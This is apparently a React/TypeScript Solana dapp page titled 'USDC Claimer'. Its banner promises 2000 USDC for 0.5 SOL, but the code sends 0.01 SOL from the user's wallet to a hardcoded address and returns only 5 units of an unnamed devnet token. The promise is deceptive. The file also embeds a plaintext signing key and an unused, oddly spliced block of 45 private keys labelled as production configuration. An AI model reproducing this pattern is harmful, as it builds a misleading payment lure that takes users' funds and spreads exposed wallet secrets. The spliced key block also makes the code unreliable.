/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4k33w8Q5EfmtYKMgPZwagvoEn4Lt7FqJJ54AhhEVCUuBVpx1ps5UEwRZR1YLURpeoDYjdHe1fm43uJ3PEXxW51Us"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3qsyyqG1AGpRqT7MFeMoQjR5rLcVFJqpMUByyx3VBV4QYWWhVqkdmVGq6YBY6sABwqqydARVAkQ2MQVfssrzv7AT",
  "key1": "4jYgfBoBUTaaA5Nrqxt1dEVXMghscruqiaUrsuXVBbdmpAndnkewKv1Ho3JirG3tQRXaqofHjon85nsqayjm8wTd",
  "key2": "61yd65N9skcJyeRUqciup6XviQj92nuMvdQQjhxc9gBpofAhWngRmQ5YCyLmQmcJ3Vx1L4xG15kKRqUvtUErDEcx",
  "key3": "4mebXjLcCYohfuvNz98BDYmdyrsD9T4U8uuL2pxzQaJ6UedwHE4bjSAYwUCgF5eqEnS9wQGzgLrP4idMTDuSWcQE",
  "key4": "5z1MbrEPud6dtsJPPpAvLoHLkVtnDFAYEgNgpW37dmkQK8WbAwaeqDeQ4DPUPiSTt2Q7FDd4zq164D3QCPPHNecj",
  "key5": "5MDBKgM7rDqQBMgiSeCEVGNW55N1Gozxvsiy41s3U5HnVEYrNhRGEu8LgCPtzYTtAaSQi3m25CWmrzQpfyitkRbs",
  "key6": "2PvV7j3EpiNmyvXVNqHi57SAitUrJXmdTxhCmZkbY1k9TnnRRoAsHq6usDULiVi6Sqcxtw6LDZ7yxMMX6zUpy3Ez",
  "key7": "TWxQ8g4AaEfjDRmz4Rpum1M7L8mKucvBnQxCfJKFcg7wLookixUzWV4ym14sR9s7RdAhSUnBu1PHTLXErqFyP9g",
  "key8": "2kcxMcvrJS4rWLneTxDXKnWAiNnquL5y55xw3WugtxxAvomU1qQDKGZ5rXwsrhGBwdE3PUyWsfhSZq8hmx5GKNVo",
  "key9": "64tRKFcTnCGYzjNFcmHhtsjFaM4h9GGg4B5ffwRDoe56rK5waYyZmjb9LgLenRTUeUYQmm7R5EwyBRgHy44vnn8m",
  "key10": "63mRyftUzU7KFeJnRLe2bjNa7GB5DCaLMswPz3G8kQ1N3Qijmapv3rahvCroCLLr4B1Jeqkk487z2mH23Mx2YiYe",
  "key11": "4QLz76L5EQAdUyX4o3GtUToHgdm36CLYWbx59tjXpPPZA77qUfjnCE6216N83ztHC8D35zEAbhqU6vYX7Vu2evsp",
  "key12": "3E7pAeKQZKcPX1wUfMxqKBb74vUcHosRiqsriRfB3hffKpimdMoLtBESMPu7x6eb1vxjZ3Ec68AZ9DUaWhFuVvUZ",
  "key13": "4Y1sejS5QtuiCLa8XXVAhoTqyXkErAGkF75mvYQvzyo95TXDMD9z3NSGZvwFePTczWrs8DoZhx3qgYhM49CoeLZd",
  "key14": "2zAMvB2LDrBB6RmbtdT7oenKyrMjQSVEQZpYvKgJe58UzMWX9MPP4p9oAvug6pR2FcvXmSs7tyYVGjeY6pYBVhmd",
  "key15": "5mVWAFc39WaQABsZFgjNe45Ja3Sp5roegSts6iQxjiGu4mqTsS2ZaVGk44821xmC5Yf1wdVKeDCaCqLA5DGnq8qp",
  "key16": "5QccDkQv9zXjgMhgLaeYCNqa46NTdwNgwjkY8aJPdk9vDrfboDSj6fWS9JitRGQingbyAHceqHGdgkD2VYQAyr49",
  "key17": "63SHVBB7PgE9SR6oHE3z88FrNbqaX2CjwJu98eVxs5TZgUhWYLN1iTrNNY531NXaVYEN1LgimwLB7DGqLE76FnWd",
  "key18": "3dV6jJsefPMQA5mpnxwyiMAf9n76zXFZVMHobyYGpgez4bBrzG71ykWxsoeRf9QjGHRAuzBSW3Lrjv84jMnoYbXa",
  "key19": "3miQ1msgGYUGKEAwhwW7m7G2CFE4XpSmyRTeCSSS9dkbwH5eZFoFieD43bjs2xTzHhQ7qHdts6Xfw7mdgd3TATc9",
  "key20": "5aVtEqvfZKxZXzqdMgF8rHV5RuGhY2PhSKCa19B8mZZkTq8UCEzjtJSccxyGfvRCwZksadFLMHgvZ4oQRCx974en",
  "key21": "4nBFWXRfSVSXWyPd24LfTr88g51FaNBv5wLB5THSGQSs732ewhQCHop3Dccoi2D6Yj8svxEbh8C6MvTLxfhj2eQF",
  "key22": "5MTrT7uMCWEojYRT1vjNopLqkYfaJpMBNqz34zvUKZWuxY4tzDripuLW38qXZxmCBhPSxtvcvZJqAbARYVf7LAQy",
  "key23": "3NDgs95B1RyVRCAmwmui5EmoG3sWrBe9KnXmf7wjGzN2BJuAsrq6zGV9wSzuF3z3AFzaf1MS4PFzNSCmpyn3xoBa",
  "key24": "3uv5ZX7GUPTNfH8ufX4KctodPxp7S2qjFazVqSsiSygAECfrqFXHTKGQa6NwyNGzJ8sYNh1PnwMH5ah2WXwc91EX",
  "key25": "3dyEcLF2GWbLmsEazQnbQwoKfoixj8pdPa4UpUy3rHYGPZZuRsM9BW9v36yqMzaSWkB5BDgLRoE1C1mTWTHmyqiY",
  "key26": "5KfXD2zkvGkPgj9ZDu8DAwt5749tNjJvZfZT4dcT92bNXKzhyfvZaf7994VKuDdhDr9kWq8JSPo5sa2GieQ9wmNo",
  "key27": "28MphEL3vhqQhxo5jkBYCmB6FSsjSaog7TGfJ8wYeEfgEcx4pNftdEWRajSKrJ7w95X2Eowt5M76gR2C4Zh6eC5Q",
  "key28": "62MKzq1home1743bUjsaMBnieGEMoa4XktQCU9PdPXEztnMfRaEL4pYNhGDeD545HxHM85cnnfkBpweZFNzTYbF7",
  "key29": "34DUKGGrwXfUvzSsukNqXFoi3pFmNP9b2gbySvWtkt3x6NVD4FWi6jmJTBVb8cDdVUUHMkwhKZKao5EtRG4ShBeF",
  "key30": "471RqrWkbYmPBjX9b12cQ9pAGcQqG5XuT1Butn1wt3EC1gs4Wu4nWcJtufdRbB5UwmNCqxryYzAgETmSW38ZyCSZ",
  "key31": "66BiYKCRXzYZsWk5E4FJuRRVvSBEJ1VNS7oTbtFmcuE1bGZDDfCidxPzh8rgwTzvkbgDD9hSxMcSq5WZ1ALpLZ5Q",
  "key32": "DAzbJDXiZGUNF5UxxGcpsjxVQR3VqCS26nCHXDPhv5fjMu8sRWBJfkdLeRub9qVuk21UH2zBwD3eD7WG5JhCAJx",
  "key33": "35kkPPUBjBejY1g9hPFqNgg6ZsPUgMpz1tepm5yrz8Rom23To7i1tPuhAyRPh7FsL64hRV7JXNGTCKFJeTwWLBSk",
  "key34": "25PwKrH3DQpDsn9GZPbSuKnXAyzMxCv7Tr8QtRSphrCGFYFfqUk2F3Ap15ziVGnCZVe16i95rtc5jkvJUnYry8S3",
  "key35": "4hFyrt1fsWyFign67mfVPUELUDKUVAHjokZgXACxT6jRb9kVxBRe8TLHSbRTMPC94c7NeWPajGez8j2AESG6jC1J",
  "key36": "NR5wKL4dPNjspfVJWvD1YcDL8kCdnhGB9wfFswESsH41UjMsgkYGV3ar4d53MQ6fHQrSk2gV9km6gXbfJKpBuBv",
  "key37": "5WyPzc1B5qRAtKME47NoHSLapDJVG6EGLkVEEiQeijWhmVW7V9xrALCtWVbi9SxmNegMVL2LimtbQXvuzioezkqN",
  "key38": "36nbRXB1ghxiqKgonwNewCeQTXEf4ZZQ5pBKRgCX4P16fff1UBZV3cruZpfTMzKRyo81ZS7ocX1Bs192oDKE9Ax1",
  "key39": "3cBEvfgp443sef4GfsRghA4wfhkGmFCgNEiqedV58EW2UFwvTLYLtbVbDy2yWFjD9ZiTKbkVMt1Drwwyi3PWZGEz",
  "key40": "2mMu3R9YxfNg4Ye3MJ4XTYeAEMMnJxTa4JBCZEy3cJB6DU9JtJGQc7s5SD8tm2hHtTaDQYaWFzx2BoRDYAPY5Emw",
  "key41": "66qeD78WxstT8QqH7ZnZJUPUFwrc1aAZbXkwfy11vFuFwbm3TNSACqBAjTRsw3Dn3YptZHRf5q4BpaTq2VKU5FMZ",
  "key42": "2dxbU4JmXYonTCpDhgkUJ7pY3QaoZFJgWPNY4RZdhcZkK44hLodMvZKFpGDQeCxR8sDL6Exqni8AFBg4yMHb7FNp",
  "key43": "3AXjv7GSPWNCiYJ3U8PgXh33AgeZU4FhCzkoSMqCpdRe6Z5ppwaA9h8o3rMAnExoYE6GSiP6isdVPSCALjXaca46",
  "key44": "56tmTmm3rPibEgxqpwjzT7YdprhWoXNWB69LuVKpmZafXG72qnRpambkicWQFo6tPUydj9Qg9XahvgsVyT7yRSiP"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
